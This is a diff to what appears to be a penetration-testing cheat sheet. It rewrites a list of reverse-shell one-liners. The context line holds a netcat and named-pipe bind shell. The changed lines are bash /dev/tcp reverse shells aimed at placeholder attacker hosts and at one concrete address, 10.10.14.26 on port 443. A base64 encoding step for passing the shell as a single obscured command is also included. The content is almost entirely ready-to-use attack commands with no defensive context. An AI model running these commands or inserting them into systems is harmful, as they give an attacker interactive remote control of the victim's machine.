@@ -263,9 +263,10 @@ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l $TARGET 1234
 
 - **No NC**:
 ```
-bash &>/dev/tcp/DEST_IP/DEST_PORT <&1
-bash -c "bash &>/dev/tcp/DEST_IP/DEST_PORT <&1"
-bash -i >& /dev/tcp/DEST_IP/DEST_PORT 0>&1
+/bin/bash &>/dev/tcp/DEST_IP/DEST_PORT <&1
+/bin/bash -c "/bin/bash &>/dev/tcp/DEST_IP/DEST_PORT <&1"
+"/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.26/443 0>&1'"
+/bin/bash -i >& /dev/tcp/DEST_IP/DEST_PORT 0>&1
 
 # Encode to base64 for oneliner + decode
 echo -n 'bash -c "bash -i >& /dev/tcp/ATTACKING_IP/ATTACKING_PORT 0>&1"' | base64
